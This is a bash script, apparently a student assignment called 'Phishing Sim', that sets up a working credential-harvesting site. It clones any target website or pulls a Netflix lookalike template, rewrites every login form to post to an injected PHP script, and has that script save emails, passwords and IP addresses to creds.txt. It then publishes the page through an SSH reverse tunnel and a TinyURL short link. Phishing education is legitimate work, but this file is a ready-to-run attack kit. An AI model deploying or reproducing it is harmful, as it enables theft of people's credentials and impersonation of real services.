#!/bin/bash

# WEB FUNDAMENTALS | PROJECT: PHISHING
# Student Name: 
# Program Code: 
# Class Code: 
# Lecturer: Shiffman David

# Functions to handle safe exit on Ctrl+C or crash or user choise
function graceful_exit() {
	# clear
	echo -e "\033[1;33m[!] Safe Exit initiated by user.\033[0m"
	echo
	echo -e "\033[1;34m[*] Stopping all related services...\033[0m"
	echo
	stop_services
	echo -e "\033[1;32m[✓] All services stopped. Exiting...\033[0m"
	sleep 2
	exit 0
}
function crash_exit() {
	# clear
	echo -e "\033[1;31m[✘] Ctrl+C detected or script crashed. Exiting safely...\033[0m"
	echo
	echo -e "\033[1;34m[*] Stopping all related services...\033[0m"
	echo
	stop_services
	echo -e "\033[1;32m[✓] All services stopped. Exiting...\033[0m"
	sleep 2
	exit 1
}
function stop_services() {
	if systemctl is-active --quiet apache2; then
		echo -e "\033[1;36m[+] Stopping Apache2 service...\033[0m"
		systemctl stop apache2
		rm -rf "$site_dir/ssl"
	fi

	# Kill LocalTunnel processes if running
	if pgrep -x "lt" > /dev/null || pgrep -f "localtunnel" > /dev/null; then
		echo -e "\033[1;36m[+] Stopping LocalTunnel...\033[0m"
		pkill -f "localtunnel" 2>/dev/null
		pkill -x "lt" 2>/dev/null
		rm -f /tmp/lt.log
	fi
	
	if [[ -f /tmp/lt.pid ]]; then
		kill "$(cat /tmp/lt.pid)" 2>/dev/null
		rm -f /tmp/lt.pid
	fi
}

# Trap CTRL+C and unexpected errors to crash_exit
trap crash_exit SIGINT SIGTERM ERR

#Variables
country=$(curl -s ipinfo.io/country)
DOMAINIP=$(hostname -I | awk '{print $1}')

# Restrict the user to run the script only with root privileges and checks for password.
function root() {
	
	if [[ $EUID -ne 0 ]]; then
		echo "Sorry, this script must be run as root !"
		echo
		echo "Exiting..."
		sleep 2
		exit
	fi
	
	echo -e "============ You are root ============"
	echo
	read -s -p "Enter Password: " pass
	echo
	
	if [[ "$pass" == "mrsuda" ]]; then
		echo
		echo -e "\033[1;32m[✓] CORRECT\033[0m"
		sleep 2
		# clear
		banner
	else
		echo -e "\e[31m - Wrong password. Exiting... - \e[0m"
		sleep 2
		exit
	fi
}



# Animated Banner + Spinning Globe
function banner() {
	local text="PHISHING  SIM"
	
	# Check and install figlet if missing
	if ! command -v figlet &>/dev/null; then
		echo -e "\033[1;33m[!] Installing figlet...\033[0m"
		sudo apt install -y figlet > /dev/null 2>&1
	fi

	# Animated figlet one character at a time
	local length=${#text}
	for ((i = 1; i <= length; i++)); do
		clear
		echo -e "\033[1;32m"
		figlet "${text:0:i}"
		echo -e "\033[0m"
		sleep 0.10
	done

	# Spinning globe animation (1 full rotation)
	local spin='🌍🌎🌏🌍🌎🌏'
	for ((i=0; i<${#spin}; i++)); do
		echo -ne "\r\033[1;36m[+] Loading ${spin:i:1} \033[0m"
		sleep 0.3
	done
	echo -e "\r\033[1;36m[✓] Ready to launch.\033[0m"
	sleep 1
	tools
}

# Function to install the recwired tools if missing
function tools() {
	local dependencies=("wget" "apache2" "certbot" "php" "curl" "git" ) 
	local missing=()

	echo -e "\033[1;34m[+] Checking required tools...\033[0m"

	for tool in "${dependencies[@]}"; do
		if ! command -v $tool &> /dev/null; then
			missing+=("$tool")
		fi
	done

	if [ ${#missing[@]} -eq 0 ]; then
		echo -e "\033[1;32m[✓] All required tools are already installed.\033[0m"
	else
		echo -e "\033[1;33m[!] Missing tools detected: ${missing[*]}\033[0m"
		sleep 1
		echo -e "\033[1;34m[+] Installing missing tools...\033[0m"
		sleep 1
		apt update -y > /dev/null 2>&1
		for tool in "${missing[@]}"; do
			echo -e "\033[1;36m[+] Installing: $tool\033[0m"
			apt install -y $tool > /dev/null 2>&1
		done
		echo -e "\033[1;32m[✓] All missing tools installed successfully!\033[0m"
	fi
	directory
}

# function to choose a path/directory
function directory() {
	# clear
	echo -e "\033[1;36m===========================================\033[0m"
	echo -e "\033[1;32m        SETTING UP DEFAULT WEB PATH\033[0m"
	echo -e "\033[1;36m===========================================\033[0m"
	echo

	site_dir="/var/www/html"
	export site_dir

	echo -e "\033[1;34m[*]\033[0m Working directory set to: $site_dir"
	echo
	sleep 2
	menu
}

# Main menu function -
function menu() {
	# clear
	echo -e "\033[1;36m===========================================\033[0m"
	echo -e "\033[1;32m          TARGET SETUP MENU\033[0m"
	echo -e "\033[1;36m===========================================\033[0m"
	echo
	echo -e "\033[1;33m[1]\033[0m Clone a Website"
	echo -e "\033[1;33m[2]\033[0m Use Built-in Template (Netflix)"
	echo -e "\033[1;33m[3]\033[0m Exit"
	echo
	read -p "Enter your choice [1-3]: " choice
	echo

	case $choice in
		1)
			clone
			;;
		2)
			template
			;;
		3)
			echo -e "\033[1;31m[!] Exiting...\033[0m"
			graceful_exit
			;;
		*)
			echo -e "\033[1;31m[✘] Invalid choice. Please select 1, 2, or 3.\033[0m"
			sleep 1
			menu
			;;
	esac
}

# Function to use the template netflix page
function template() {
	echo -e "\033[1;34m[+]\033[0m Downloading phishing template from GitHub..."
	echo
	wget -q -O "$site_dir/index.html" "https://raw.githubusercontent.com/MR-Suda/Phishing-Project/master/index.html"
	wget -q -O "$site_dir/login.php" "https://raw.githubusercontent.com/MR-Suda/Phishing-Project/master/login.php"
	wget -q -O "$site_dir/netflix-bg.jpg" "https://raw.githubusercontent.com/MR-Suda/Phishing-Project/master/netflix-bg.jpg"

	if [[ ! -f "$site_dir/index.html" || ! -f "$site_dir/login.php" || ! -f "$site_dir/netflix-bg.jpg" ]]; then
		echo -e "\033[1;31m[✘] One or more files failed to download. Check your connection or repo URL.\033[0m"
		exit 1
	fi

	echo -e "\033[1;32m[✓]\033[0m Template downloaded and setup completed!"
	echo
	echo -e "\033[1;34m[+]\033[0m Starting HTTPS server configuration..."
	echo
	sleep 2
	apachesetup
}

# function to set up apache
function apachesetup() {
	
    systemctl enable apache2
    systemctl restart apache2
    dom
}

# Function to ask for domain
function dom() {
	
	read -p "Do you have a domain? [y/n] -" ans
	if [[ "$ans" =~ ^[Yy]$ ]]; then
	domainsetup
	elif [[ "$ans" =~ ^[Nn]$ ]]; then
	sshsetup
	fi
	sshsetup
}

# Function to use ssh
function sshsetup() {
    echo "[*] Launching localhost.run tunnel in background..."
    touch /var/www/html/debug.log
	chown www-data:www-data /var/www/html/debug.log
	chmod 664 /var/www/html/debug.log
    chown -R www-data:www-data /var/www/html
	systemctl restart apache2
    [[ -f ~/.ssh/id_ed25519 ]] || ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N "" -q
	ssh -i ~/.ssh/id_ed25519 -R 80:localhost:80 ssh.localhost.run > /tmp/tunnel.log 2>&1 &
	
    for i in {1..10}; do
	sleep 1
	url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.lhr\.life' /tmp/tunnel.log | head -n1)
	[[ -n "$url" ]] && break
	done

	if [[ -n "$url" ]]; then
		echo "[✓] Tunnel URL: $url"
	else
		echo "[✘] Failed to get tunnel URL"
		cat /tmp/tunnel.log
	fi
	short_url=$(curl -s "https://tinyurl.com/api-create.php?url=$url")
	echo "[✓] Shortened URL: $short_url"
	sleep 1000
	domainsetup
}

function domainsetup() {
	read -p "Enter your domain (e.g., phishingpage.live): " domain

	echo -e "\033[1;34m[+] Setting up Apache config for $domain...\033[0m"
	cat <<EOF > /etc/apache2/sites-available/$domain.conf
<VirtualHost *:80>
	ServerName $domain
	DocumentRoot $site_dir
</VirtualHost>
EOF

	a2ensite "$domain.conf"
	systemctl reload apache2

	echo -e "\033[1;34m[+] Attempting SSL certificate setup...\033[0m"
	certbot --apache -d "$domain" --non-interactive --agree-tos -m your_email@example.com

	echo -e "\033[1;32m[✓] Domain and SSL configured!\033[0m"
	clone
}

function clone() {
	read -p "Enter target website URL (e.g., https://example.com): " target_url
	echo -e "\033[1;34m[+] Cloning $target_url into $site_dir...\033[0m"
	
	# Clear the existing HTML directory first
	rm -rf "$site_dir"/*
	
	# Clone the website (basic mirror)
	wget --mirror --convert-links --adjust-extension --page-requisites --no-parent "$target_url" -P "$site_dir" > /dev/null 2>&1
	
	if [[ $? -ne 0 ]]; then
		echo -e "\033[1;31m[✘] Failed to clone $target_url\033[0m"
		sleep 2
		menu
	fi

	# Inject login.php to the main login page (assumes it exists)
	cp "$site_dir/index.html" "$site_dir/index_backup.html"

	# Replace action form targets with our credential collector
	sed -i 's/action="\([^"]*\)"/action="login.php"/g' "$site_dir/index.html"
	
	# Add the login.php script
	cat <<EOF > "$site_dir/login.php"
<?php
\$email = \$_POST['email'] ?? '';
\$password = \$_POST['password'] ?? '';
\$ip = \$_SERVER['REMOTE_ADDR'];
\$time = date("Y-m-d H:i:s");
\$data = "[\$time] IP: \$ip | Email: \$email | Pass: \$password\\n";
file_put_contents("creds.txt", \$data, FILE_APPEND);
header("Location: https://$target_url");
exit();
?>
EOF

	chown www-data:www-data "$site_dir/login.php"
	echo -e "\033[1;32m[✓] Site cloned and PHP login hook injected.\033[0m"
	sleep 1
	apachesetup
}

# calls the first function
root
colors
